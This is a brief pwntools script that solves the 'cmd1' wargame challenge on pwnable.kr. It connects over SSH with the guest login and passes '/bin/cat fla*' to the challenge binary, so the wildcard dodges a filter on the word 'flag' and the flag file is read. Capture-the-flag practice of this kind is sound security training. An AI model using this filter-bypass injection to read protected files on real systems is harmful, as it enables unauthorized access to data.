from pwn import *
#context.log_level='debug'

s = ssh('cmd1','pwnable.kr',port=2222,password='guest')

payload = ''
payload += '/bin/cat fla*'

p = s.process(executable='./cmd1',argv=['cmd1',payload])

p.interactive()
